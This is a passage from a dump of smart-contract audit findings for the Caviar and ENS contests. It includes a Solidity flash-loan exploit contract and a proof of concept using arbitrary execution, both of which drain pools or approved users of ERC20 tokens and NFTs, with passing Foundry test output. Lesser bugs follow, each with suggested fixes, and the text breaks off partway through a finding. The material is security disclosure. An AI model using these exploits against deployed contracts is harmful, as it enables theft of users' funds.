^0.8.19;  import {ERC20} from \"solmate/tokens/ERC20.sol\"; import {ERC721} from \"solmate/tokens/ERC721.sol\"; import {IERC3156FlashBorrower} from \"openzeppelin/interfaces/IERC3156FlashBorrower.sol\"; import {PrivatePool} from \"../PrivatePool.sol\";   contract PrivatePoolExploit is IERC3156FlashBorrower {     PrivatePool private immutable _privatePool;     ERC20 private immutable _baseToken;     ERC721 private immutable _nftToken;     address private immutable _owner;      uint private transferFromCalled;      uint[] private tokenIds;      constructor(PrivatePool _target) {         _privatePool = _target;         _baseToken = ERC20(_target.baseToken());         _nftToken = ERC721(_target.nft());         _owner = msg.sender;     }      function attack(uint[] calldata _tokenIds) external {         tokenIds = _tokenIds;         _privatePool.flashLoan(             this,             address(this),             0,             abi.encode(_tokenIds)         );     }       function safeTransferFrom(         address,         address,         uint256     ) public {     }      function onFlashLoan(         address,         address,         uint256,         uint256,         bytes calldata     ) external returns (bytes32) {         // Transfer all base tokens to this contract         _baseToken.transferFrom(address(_privatePool), address(this), _baseToken.balanceOf(address(_privatePool)));          // Transfer all NFTs to the owner         for (uint i = 0; i < tokenIds.length; i++) {             _nftToken.transferFrom(address(_privatePool), _owner, tokenIds[i]);         }          // Get the fee that needs to be repaid and approve the amount         uint256 fee = _privatePool.flashFee(address(0), 0);         _baseToken.approve(address(_privatePool), fee);          // Transfer all excess base tokens to the owner         _baseToken.transfer(_owner, _baseToken.balanceOf(address(this)));          return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");     }      function ownerOf(uint) public view returns (address) {         return address(_privatePool);     }      function onERC721Received(         address,         address,         uint256,         bytes calldata     ) external pure returns (bytes4) {         return this.onERC721Received.selector;     } } ```  Attack.t.sol ```solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.19;  import \"../Fixture.sol\"; import \"../../src/attacks/PrivatePoolExploit.sol\"; import {ERC20} from \"solmate/tokens/ERC20.sol\";  contract ERC20Example is ERC20 {     constructor(string memory _name, string memory _symbol, uint8 _decimals) ERC20(_name, _symbol, _decimals) {         _mint(msg.sender, 100_000 * 10**_decimals);     } }  contract AttackTest is Fixture {     event Buy(         uint256[] tokenIds,         uint256[] tokenWeights,         uint256 inputAmount,         uint256 feeAmount,         uint256 protocolFeeAmount,         uint256 royaltyFeeAmount     );      address bob = address(0x1);     address alice = address(0x2);      PrivatePoolExploit public privatePoolExploit;     ERC20 public baseToken;      address nft = address(milady);     uint128 virtualBaseTokenReserves = 100e6;     uint128 virtualNftReserves = 5e18;     uint16 feeRate = 0;     uint56 changeFee = 0;     bytes32 merkleRoot = bytes32(0);     bytes32 salt = bytes32(0);     uint256 baseTokenAmount = 500e6;     uint256[] tokenIds;     uint256[] tokenWeights;     PrivatePool.MerkleMultiProof proofs;      function setUp() public {         vm.startPrank(bob);         privatePoolImplementation = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));         baseToken = new ERC20Example(\"USDC\", \"USDC\", 6);           for (uint256 i = 0; i < 5; i++) {             milady.mint(address(bob), i);             tokenIds.push(i);         }     }      function test_exploit() public {          // Approve all NFTs and baseToken to the Factory         baseToken.approve(address(factory), type(uint256).max);         milady.setApprovalForAll(address(factory), true);           PrivatePool privatePool = factory.create(             address(baseToken),             address(milady),             virtualBaseTokenReserves,             virtualNftReserves,             changeFee,             feeRate,             merkleRoot,             true,             false,             salt,             tokenIds,             baseTokenAmount         );          // First Bob deploys the exploit contract         privatePoolExploit = new PrivatePoolExploit(privatePool);           // Then Bob approves the exploit contract to spend PrivatePool's baseToken and NFTs         privatePool.execute(             address(baseToken),             abi.encodeWithSignature(\"approve(address,uint256)\", address(privatePoolExploit), type(uint256).max)         );          privatePool.execute(             address(nft),             abi.encodeWithSignature(\"setApprovalForAll(address,bool)\", address(privatePoolExploit), true)         );           // Bob sells the ownership of the PrivatePool to Alice (as an example just transfering the ownership)         uint tokenIdOfPrivatePool = uint256(uint160(address(privatePool)));         factory.transferFrom(bob, alice, tokenIdOfPrivatePool);          assertEq(factory.ownerOf(tokenIdOfPrivatePool), alice);          uint balanceBeforeAttack = baseToken.balanceOf(bob);         uint erc721BalanceBeforeAttack = milady.balanceOf(bob);          // Bob runs the exploit         privatePoolExploit.attack(tokenIds);          uint balanceAfterAttack = baseToken.balanceOf(bob);         uint erc721BalanceAfterAttack = milady.balanceOf(bob);          assertEq(balanceAfterAttack, balanceBeforeAttack + baseTokenAmount - changeFee);         assertEq(erc721BalanceAfterAttack, erc721BalanceBeforeAttack + tokenIds.length);     } } ```  Result of the test ``` Running 1 test for test/PrivatePool/Attack.t.sol:AttackTest [PASS] test_exploit() (gas: 1182634) Test result: ok. 1 passed; 0 failed; finished in 7.15ms ```  ## Tools Used Foundry/VSCode  ## Recommended Mitigation Steps The contract caller should not be able to choose the token address in the `PrivatePool.flashLoan` function because there is no way to know if the token contract is actually an ERC721 contract.  Suggest removing `token` from function input parameters and using `nft` token everywhere, where `token` was used.  ```solidity     function flashLoan(IERC3156FlashBorrower receiver, uint256 tokenId, bytes calldata data)         external         payable         returns (bool)     {         address nftAddress = nft;         // check that the NFT is available for a flash loan         if (!availableForFlashLoan(nftAddress, tokenId)) revert NotAvailableForFlashLoan();          // calculate the fee         uint256 fee = flashFee(nftAddress, tokenId);          // if base token is ETH then check that caller sent enough for the fee         if (baseToken == address(0) && msg.value < fee) revert InvalidEthAmount();          // transfer the NFT to the borrower         ERC721(nftAddress).safeTransferFrom(address(this), address(receiver), tokenId);          // call the borrower         bool success =             receiver.onFlashLoan(msg.sender, nftAddress, tokenId, fee, data) == keccak256(\"ERC3156FlashBorrower.onFlashLoan\");          // check that flashloan was successful         if (!success) revert FlashLoanFailed();          // transfer the NFT from the borrower         ERC721(nftAddress).safeTransferFrom(address(receiver), address(this), tokenId);          // transfer the fee from the borrower         if (baseToken != address(0)) ERC20(baseToken).transferFrom(msg.sender, address(this), fee);          return success;     } ```"}, {"title": "PrivatePool owner can steal all ERC20 and NFT from user via arbitrary execution", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/184", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L459   # Vulnerability details  ## Impact  PrivatePool owner can steal all ERC20 and NFT from user via arbitrary execution.  ## Proof of Concept  In the current implementation of the PrivatePool.sol, the function execute is meant to claim airdrop, however, we cannot assume the owner is trusted because anyone can permissionlessly create private pool.  ```solidity /// @notice Executes a transaction from the pool account to a target contract. The caller must be the owner of the /// pool. This allows for use cases such as claiming airdrops. /// @param target The address of the target contract. /// @param data The data to send to the target contract. /// @return returnData The return data of the transaction. function execute(address target, bytes memory data) public payable onlyOwner returns (bytes memory) {  // call the target with the value and data  (bool success, bytes memory returnData) = target.call{value: msg.value}(data);   // if the call succeeded return the return data  if (success) return returnData;   // if we got an error bubble up the error message  if (returnData.length > 0) {   // solhint-disable-next-line no-inline-assembly   assembly {    let returnData_size := mload(returnData)    revert(add(32, returnData), returnData_size)   }  } else {   revert();  } } ```  the owner of private pool can easily steal all ERC20 token and NFT from the user's wallet after user give approval to the PrivatePool contract and the user has to give the approval to the pool to let the PrivatePool pull ERC20 token and NFT from the user when user buy or sell or change from EthRouter or directly calling PrivatePool,  the POC below shows, the owner of the PrivatePool can carefully crafting payload to steal fund via arbitrary execution.  after user's apporval, the target can be a ERC20 token address or a NFT address, the call data can be the payload of transferFrom or function.  Please add the code to Execute.t.sol so we can create a mock token  ```solidity contract MyToken is ERC20 {     constructor() ERC20(\"MyToken\", \"MTK\", 18) {}      function mint(address to, uint256 amount) public {         _mint(to, amount);     } } ```  Please add the POC below to Execute.t.sol  ```solidity   function testStealFundArbitrary_POC() public {         MyToken token = new MyToken();          address victim = vm.addr(1040341830);         address hacker = vm.addr(14141231201);          token.mint(victim, 100000 ether);          vm.prank(victim);         token.approve(address(privatePool), type(uint256).max);          console.log(             \"token balance of victim before hack\",             token.balanceOf(victim)         );          address target = address(token);         bytes memory data = abi.encodeWithSelector(             ERC20.transferFrom.selector,             victim,             hacker,             token.balanceOf(victim)         );          privatePool.execute(target, data);          console.log(             \"token balance of victim  after hack\",             token.balanceOf(victim)         );     } ```  We run the POC, the output is  ```solidity PS D:\\2023Security\\2023-04-caviar> forge test -vv --match \"testStealFundArbitrary_POC\" [\u2812] Compiling... [\u2811] Compiling 1 files with 0.8.19 [\u2803] Solc 0.8.19 finished in 8.09s Compiler run successful  Running 1 test for test/PrivatePool/Execute.t.sol:ExecuteTest [PASS] testStealFundArbitrary_POC() (gas: 753699) Logs:   token balance of victim before hack 100000000000000000000000   token balance of victim  after hack 0 ```  As we can see, the victim's ERC20 token are stolen.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend the protocol not let the private pool owner perform arbtirary execution, the private pool can use the flashloan to claim the airdrop himself.  "}, {"title": " Incorrect rendering of the tokenURI metadata hinders user from correctly evaluating the NFT", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/179", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "high quality report", "judge review requested", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L21   # Vulnerability details  ## Impact   Incorrect rendering of the tokenURI metadata block user from correctly evaluating the NFT  ## Proof of Concept  Please add and run the POC below in NFT.t.sol  https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/test/Factory/Nft.t.sol#L28  ```solidity     function test_tokenURI_ReturnsTokenURI_JSON_FORMAT_POC() public {         PrivatePool privatePool = new PrivatePool(             address(factory),             address(royaltyRegistry),             address(stolenNftOracle)         );         privatePool.initialize(             address(0),             address(milady),             100e18,             20e18,             2000,             0,             bytes32(0),             true,             false         );         payable(address(privatePool)).transfer(1 ether);         milady.mint(address(privatePool), 1);         milady.mint(address(privatePool), 2);         uint256 tokenId = uint160(address(privatePool));          string memory tokenURI = privatePoolMetadata.tokenURI(tokenId);          console.log(tokenURI);     } ```  the console.log output is   data:application/json;base64,eyJuYW1lIjogIlByaXZhdGUgUG9vbCAxMjQ1MTI3MzMyMzUxNDg1MDk2NzA5ODQ4NTAyNDk2NjE1MjQxNzIxNzMzNTQ5MzciLCJkZXNjcmlwdGlvbiI6ICJDYXZpYXIgcHJpdmF0ZSBwb29sIEFNTSBwb3NpdGlvbi4iLCJpbWFnZSI6ICJkYXRhOmltYWdlL3N2Zyt4bWw7YmFzZTY0LFBITjJaeUI0Yld4dWN6MGlhSFIwY0RvdkwzZDNkeTUzTXk1dmNtY3ZNakF3TUM5emRtY2lJSFpwWlhkQ2IzZzlJakFnTUNBME1EQWdOREF3SWlCemRIbHNaVDBpZDJsa2RHZzZNVEF3SlR0aVlXTnJaM0p2ZFc1a09tSnNZV05yTzJacGJHdzZkMmhwZEdVN1ptOXVkQzFtWVcxcGJIazZjMlZ5YVdZN0lqNDhkR1Y0ZENCNFBTSXlOSEI0SWlCNVBTSXlOSEI0SWlCbWIyNTBMWE5wZW1VOUlqRXlJajVEWVhacFlYSWdRVTFOSUhCeWFYWmhkR1VnY0c5dmJDQndiM05wZEdsdmJqd3ZkR1Y0ZEQ0OGRHVjRkQ0I0UFNJeU5IQjRJaUI1UFNJME9IQjRJaUJtYjI1MExYTnBlbVU5SWpFeUlqNVFjbWwyWVhSbElIQnZiMnc2SURCNE1UVmpaalU0TVRRMFpXWXpNMkZtTVdVeE5HSTFNakE0TURFMVpERXhaamt4TkRObE1qZGlPVHd2ZEdWNGRENDhkR1Y0ZENCNFBTSXlOSEI0SWlCNVBTSTNNbkI0SWlCbWIyNTBMWE5wZW1VOUlqRXlJajVDWVhObElIUnZhMlZ1T2lBd2VEQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREE4TDNSbGVIUStQSFJsZUhRZ2VEMGlNalJ3ZUNJZ2VUMGlPVFp3ZUNJZ1ptOXVkQzF6YVhwbFBTSXhNaUkrVGtaVU9pQXdlRFUyTVRWa1pXSTNPVGhpWWpObE5HUm1ZVEF4TXpsa1ptRXhZak5rTkRNelkyTXlNMkkzTW1ZOEwzUmxlSFErUEhSbGVIUWdlRDBpTWpSd2VDSWdlVDBpTVRJd2NIZ2lJR1p2Ym5RdGMybDZaVDBpTVRJaVBsWnBjblIxWVd3Z1ltRnpaU0IwYjJ0bGJpQnlaWE5sY25abGN6b2dNVEF3TURBd01EQXdNREF3TURBd01EQXdNREF3UEM5MFpYaDBQangwWlhoMElIZzlJakkwY0hnaUlIazlJakUwTkhCNElpQm1iMjUwTFhOcGVtVTlJakV5SWo1V2FYSjBkV0ZzSUU1R1ZDQnlaWE5sY25abGN6b2dNakF3TURBd01EQXdNREF3TURBd01EQXdNREE4TDNSbGVIUStQSFJsZUhRZ2VEMGlNalJ3ZUNJZ2VUMGlNVFk0Y0hnaUlHWnZiblF0YzJsNlpUMGlNVElpUGtabFpTQnlZWFJsSUNoaWNITXBPaUF3UEM5MFpYaDBQangwWlhoMElIZzlJakkwY0hnaUlIazlJakU1TW5CNElpQm1iMjUwTFhOcGVtVTlJakV5SWo1T1JsUWdZbUZzWVc1alpUb2dNand2ZEdWNGRENDhkR1Y0ZENCNFBTSXlOSEI0SWlCNVBTSXlNVFp3ZUNJZ1ptOXVkQzF6YVhwbFBTSXhNaUkrUW1GelpTQjBiMnRsYmlCaVlXeGhibU5sT2lBeE1EQXdNREF3TURBd01EQXdNREF3TURBd1BDOTBaWGgwUGp3dmMzWm5QZz09IiwiYXR0cmlidXRlcyI6IFt7ICJ0cmFpdF90eXBlIjogIlBvb2wgYWRkcmVzcyIsInZhbHVlIjogIjB4MTVjZjU4MTQ0ZWYzM2FmMWUxNGI1MjA4MDE1ZDExZjkxNDNlMjdiOSIgfSx7ICJ0cmFpdF90eXBlIjogIkJhc2UgdG9rZW4iLCJ2YWx1ZSI6ICIweDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAiIH0seyAidHJhaXRfdHlwZSI6ICJORlQiLCJ2YWx1ZSI6ICIweDU2MTVkZWI3OThiYjNlNGRmYTAxMzlkZmExYjNkNDMzY2MyM2I3MmYiIH0seyAidHJhaXRfdHlwZSI6ICJWaXJ0dWFsIGJhc2UgdG9rZW4gcmVzZXJ2ZXMiLCJ2YWx1ZSI6ICIxMDAwMDAwMDAwMDAwMDAwMDAwMDAiIH0seyAidHJhaXRfdHlwZSI6ICJWaXJ0dWFsIE5GVCByZXNlcnZlcyIsInZhbHVlIjogIjIwMDAwMDAwMDAwMDAwMDAwMDAwIiB9LHsgInRyYWl0X3R5cGUiOiAiRmVlIHJhdGUgKGJwcyk6ICIsInZhbHVlIjogIjAiIH0seyAidHJhaXRfdHlwZSI6ICJORlQgYmFsYW5jZSIsInZhbHVlIjogIjIiIH0seyAidHJhaXRfdHlwZSI6ICJCYXNlIHRva2VuIGJhbGFuY2UiLCJ2YWx1ZSI6ICIxMDAwMDAwMDAwMDAwMDAwMDAwIiB9XX0=  We can try to decode the base64 output using the website  https://onlinejsontools.com/convert-base64-to-json  the output is:  ``` {\"name\": \"Private Pool 124512733235148509670984850249661524172173354937\", \"description\": \"Caviar private pool AMM position.\", \"image\": \"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0MDAgNDAwIiBzdHlsZT0id2lkdGg6MTAwJTtiYWNrZ3JvdW5kOmJsYWNrO2ZpbGw6d2hpdGU7Zm9udC1mYW1pbHk6c2VyaWY7Ij48dGV4dCB4PSIyNHB4IiB5PSIyNHB4IiBmb250LXNpemU9IjEyIj5DYXZpYXIgQU1NIHByaXZhdGUgcG9vbCBwb3NpdGlvbjwvdGV4dD48dGV4dCB4PSIyNHB4IiB5PSI0OHB4IiBmb250LXNpemU9IjEyIj5Qcml2YXRlIHBvb2w6IDB4MTVjZjU4MTQ0ZWYzM2FmMWUxNGI1MjA4MDE1ZDExZjkxNDNlMjdiOTwvdGV4dD48dGV4dCB4PSIyNHB4IiB5PSI3MnB4IiBmb250LXNpemU9IjEyIj5CYXNlIHRva2VuOiAweDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA8L3RleHQ+PHRleHQgeD0iMjRweCIgeT0iOTZweCIgZm9udC1zaXplPSIxMiI+TkZUOiAweDU2MTVkZWI3OThiYjNlNGRmYTAxMzlkZmExYjNkNDMzY2MyM2I3MmY8L3RleHQ+PHRleHQgeD0iMjRweCIgeT0iMTIwcHgiIGZvbnQtc2l6ZT0iMTIiPlZpcnR1YWwgYmFzZSB0b2tlbiByZXNlcnZlczogMTAwMDAwMDAwMDAwMDAwMDAwMDAwPC90ZXh0Pjx0ZXh0IHg9IjI0cHgiIHk9IjE0NHB4IiBmb250LXNpemU9IjEyIj5WaXJ0dWFsIE5GVCByZXNlcnZlczogMjAwMDAwMDAwMDAwMDAwMDAwMDA8L3RleHQ+PHRleHQgeD0iMjRweCIgeT0iMTY4cHgiIGZvbnQtc2l6ZT0iMTIiPkZlZSByYXRlIChicHMpOiAwPC90ZXh0Pjx0ZXh0IHg9IjI0cHgiIHk9IjE5MnB4IiBmb250LXNpemU9IjEyIj5ORlQgYmFsYW5jZTogMjwvdGV4dD48dGV4dCB4PSIyNHB4IiB5PSIyMTZweCIgZm9udC1zaXplPSIxMiI+QmFzZSB0b2tlbiBiYWxhbmNlOiAxMDAwMDAwMDAwMDAwMDAwMDAwPC90ZXh0Pjwvc3ZnPg==\",\"attributes\": [{ \"trait_type\": \"Pool address\",\"value\": \"0x15cf58144ef33af1e14b5208015d11f9143e27b9\" },{ \"trait_type\": \"Base token\",\"value\": \"0x0000000000000000000000000000000000000000\" },{ \"trait_type\": \"NFT\",\"value\": \"0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f\" },{ \"trait_type\": \"Virtual base token reserves\",\"value\": \"100000000000000000000\" },{ \"trait_type\": \"Virtual NFT reserves\",\"value\": \"20000000000000000000\" },{ \"trait_type\": \"Fee rate (bps): \",\"value\": \"0\" },{ \"trait_type\": \"NFT balance\",\"value\": \"2\" },{ \"trait_type\": \"Base token balance\",\"value\": \"1000000000000000000\" }]} ```  As we can see, the rendered NFT name is:  ```solidity Private Pool 124512733235148509670984850249661524172173354937 ```  Using an integer in the NFT name is not good for several reasons.   Firstly, it provides limited information to the user about the NFT, making it difficult for them to understand the NFT's context and significance.   it can be inconsistent with the rendered SVG image, causing confusion and making it challenging for users to evaluate the NFT.   it can be an obstacle to user adoption as it is difficult for non-technical users to understand the significance of the integer value, and it may discourage them from investing in or using the NFT.  When rendering the SVG image, the private pool address is renderred  ```solidity <text x=\"24px\" y=\"48px\" font-size=\"12\">', \"Private pool: \", Strings.toHexString(address(privatePool), ```  while rendering the name, an integer is renderred.  ```solidity function tokenURI(uint256 tokenId) public view returns (string memory) {  // forgefmt: disable-next-item  bytes memory metadata = abi.encodePacked(   \"{\",   '\"name\": \"Private Pool ',   Strings.toString(tokenId), ```  Using the private pool address as the NFT name provides several strong arguments.   Firstly, it enhances clarity as the private pool address gives users a clear understanding of what the NFT represents and where it is associated with.   Secondly, it ensures accuracy as the private pool address is a unique identifier that can be used to verify the authenticity of the NFT.   Thirdly, it ensures consistency between the rendered SVG image and the JSON data, thus helping users better understand and evaluate the NFT.   using the private pool address as the NFT name makes it convenient for users to find and access the NFT, as it is a unique identifier that can be easily searched for and located.  ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  We recommend the protocol render the private pool address in NFT metadata name field instead of rendering the private pool address number."}, {"title": "The `tokenURI` method does not check if the NFT has been minted and returns data for the contract that may be a fake NFT.", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/44", "labels": ["bug", "2 (Med Risk)", "judge review requested", "primary issue", "selected for report", "sponsor confirmed", "M-17"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161 https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L17   # Vulnerability details  ## Impact  - By invoking the [Factory.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161) method for a maliciously provided NFT id, the returned data may deceive potential users, as the method will return data for a non-existent NFT id that appears to be a genuine PrivatePool. This can lead to a poor user experience or financial loss for users. - Violation of the [ERC721-Metadata part](https://eips.ethereum.org/EIPS/eip-721) standard  ## Proof of Concept  - The [Factory.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161) and [PrivatePoolMetadata.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L17) methods lack any requirements stating that the provided NFT id must be created. We can also see that in the standard implementation by [OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cf86fd9962701396457e50ab0d6cc78aa29a5ebc/contracts/token/ERC721/ERC721.sol#L94), this check is present: - [Throws if `_tokenId` is not a valid NFT](https://eips.ethereum.org/EIPS/eip-721)  ### Example  1. User creates a fake contract    A simple example so that the `tokenURI` method does not revert:  ```solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.19;  contract NFT {     function balanceOf(address) external pure returns (uint256) {         1;     } }  contract NonNFT {     address public immutable nft;      address public constant baseToken = address(0);     uint256 public constant virtualBaseTokenReserves = 1 ether;     uint256 public constant virtualNftReserves = 1 ether;     uint256 public constant feeRate = 500;      constructor() {         nft = address(new NFT());     } } ```  2. User deploy the contract 3. Now, by using `tokenURI()` for the deployed user's address, one can fetch information about a non-existent NFT.  ## Tools Used  - Manual review - Foundry  ## Recommended Mitigation Steps  - Throw an error if the NFT id is invalid. "}, {"title": "HexUtils.hexStringToBytes32() and HexUtils.hexToAddress() may return incorrect results", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/281", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/HexUtils.sol#L11 https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/HexUtils.sol#L68   # Vulnerability details  ## Impact The `HexUtils.hexStringToBytes32()` and `HexUtils.hexToAddress()` may return incorrect results if the input data provided is not in a standard format.  This could cause the contract to behave abnormally in some scenarios or be exploited for malicious purposes.  ## Proof of Concept The function `HexUtils.hexStringToBytes32(bytes memory str, uint256 idx, uint256 lastIdx)` is used to convert a hexadecimal string `str[idx...lastIndx]` to a `bytes32`.  However, the function lacks some critical checks on the input data, resulting in the following situations: 1. If the length `lastIdx - idx` is odd, it will not revert, but will read an additional out-of-range byte `str[lastIdx]` and return it. 2. If the length `lstIdx - idx > 32`, it will not revert, but will discard the excess data at the beginning and return the last 32 bytes. 3. If the length `lstIdx - idx < 32`, it will not revert, but will pad the data with zeros at the beginning.  The following test code verifies these situations:  ``` diff --git a/test/utils/HexUtils.js b/test/utils/HexUtils.js index 296eadf..e12e11c 100644 --- a/test/utils/HexUtils.js +++ b/test/utils/HexUtils.js @@ -16,6 +16,44 @@ describe('HexUtils', () => {      HexUtils = await HexUtilsFactory.deploy()    })  +  describe.only('Special cases for hexStringToBytes32()', () => { +    const hex32Bytes = '5cee339e13375638553bdf5a6e36ba80fb9f6a4f0783680884d92b558aa471da' +    it('odd length 1', async () => { +      let [bytes32, valid] = await HexUtils.hexStringToBytes32( +        toUtf8Bytes(hex32Bytes), 0, 63, +      ) +      expect(valid).to.equal(true) +      // the last 4 bits (half byte) of hex32Bytes is out of range but read +      expect(bytes32).to.equal('0x' + hex32Bytes) +    }) +    it('odd length 2', async () => { +      let [bytes32, valid] = await HexUtils.hexStringToBytes32( +        toUtf8Bytes(hex32Bytes + '00'), 1, 64, +      ) +      expect(valid).to.equal(true) +      // the first half byte of '00' is out of range but read +      expect(bytes32).to.equal('0x' + hex32Bytes.substring(1) + '0') +    }) +    it('not enough length', async () => { +      let [bytes32, valid] = await HexUtils.hexStringToBytes32( +        toUtf8Bytes(hex32Bytes), 0, 2, +      ) +      expect(valid).to.equal(true) +      // only one byte is read, but it is expanded to 32 bytes +      expect(bytes32).to.equal( +        '0x000000000000000000000000000000000000000000000000000000000000005c', +      ) +    }) +    it('exceed length', async () => { +      let [bytes32, valid] = await HexUtils.hexStringToBytes32( +        toUtf8Bytes(hex32Bytes + \"1234\"), 0, 64 + 4, +      ) +      expect(valid).to.equal(true) +      // 34 bytes is read, and returns the last 32 bytes +      expect(bytes32).to.equal('0x' + hex32Bytes.substring(4) + '1234') +    }) +  }) +    describe('hexStringToBytes32()', () => {      it('Converts a hex string to bytes32', async () => {        let [bytes32, valid] = await HexUtils.hexStringToBytes32( ```  Test code outputs: ```   HexUtils     Special cases for hexStringToBytes32()       \u2713 odd length 1       \u2713 odd length 2       \u2713 not enough length       \u2713 exceed length  ```  Since [HexUtils.hexToAddress()](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/HexUtils.sol#L68) is implemented by directly calling `HexUtils.hexStringToBytes32()`, it also has similar issues.   ## Tools Used VS Code  ## Recommended Mitigation Steps Should revert the function if the input length `lastIdx - idx` is odd.  For cases where the length is greater than or less than 32 (or 20) - if the current implementation meets the requirements, the design should be detailed in a comment - otherwise the function should revert if the length is not 32 (or 20) "}, {"title": "DNSSECImpl.validateRRs might not work properly", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/278", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/DNSSECImpl.sol#L196-L207   # Vulnerability details   ## Impact `DNSSECImpl.validateRRs` validates when the names are not the same on all RRs.  ## Proof of Concept  `DNSSECImpl.validateRRs` loops iterater and checks names are the same on all RRs. ```solidity             if (name.length == 0) {                 name = iter.name();             } else {                 // Name must be the same on all RRs. We do things this way to avoid copying the name                 // repeatedly.                 if (                     name.length != iter.data.nameLength(iter.offset) ||                     !name.equals(0, iter.data, iter.offset, name.length)                 ) {                     revert InvalidRRSet();                 }             } ```  But when the name is null string for the first a few RRs, and the same for the rest RRs, this will pass this loop although all names are not the same. So `DNSSECImpl.validateRRs` will not work as intended.   ## Tools Used Manual Review  ## Recommended Mitigation Steps  We can use `isFirst` flag instead of checking the length of `name`. ```solidity  -          if (name.length == 0) {  +          if (isFirst) {  +              isFirst = false;                 name = iter.name();             } else { ``` "}, {"title": "BytesUtils.compare doesn't work for unicode", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/277", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L92-L93 https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L40-L43   # Vulnerability details   ## Impact BytesUtils.compare returns wrong resuls for unicode, and it might revert in some cases.   ## Proof of Concept `BytesUtils.compare` doesn't support unicode. The comment before the `compare` method says the comparison is done for unicodes and compare two bytes at a time.  ```      * @dev Returns a positive number if `other` comes lexicographically after      *      `self`, a negative number if it comes before, or zero if the      *      contents of the two bytes are equal. Comparison is done per-rune,      *      on unicode codepoints. ```  When it compares, it converts bytes data to signed integer and there is subtraction, too. ```solidity                 int256 diff = int256(a & mask) - int256(b & mask);                 if (diff != 0) return diff; ```  This is not correct for unicode. `0xffe1`(fullwidth pound sign) will be less than `0x03A9`(capital omega). Even worse, `BytesUtils.compare` will revert for `0x8000` and `0x03A9`.  We can check it using the following test. ```solidity     function testComparePartialUnicode() public pure {         require(             bytes(hex\"ffe1\").compare(0, 2, bytes(hex\"03a9\"), 0, 2) < 0 == true,             \"fullwidth pound sign vs character 0\"         );         require(             bytes(hex\"8000000000000000000000000000000000000000000000000000000000000000\").compare(                 0, 32, bytes(hex\"03a9000000000000000000000000000000000000000000000000000000000000\"), 0, 32) < 0 == true,             \"This will revert\"         );     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps  We can use direct comparison instead of conversion to signed integer. ```solidity                 }  -              int256 diff = int256(a & mask) - int256(b & mask);  -              if (diff != 0) return diff;  +              if( (a & mask) < (b & mask) ) {  +                  return -1;  +              } else if( (a & mask) > (b & mask) ) {  +                  return 1;  +              }             } ``` "}, {"title": "EllipticCurve.validateSignature accepts rs[1] >= n", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/276", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-04-ens-findings", "body": "# Lines of code  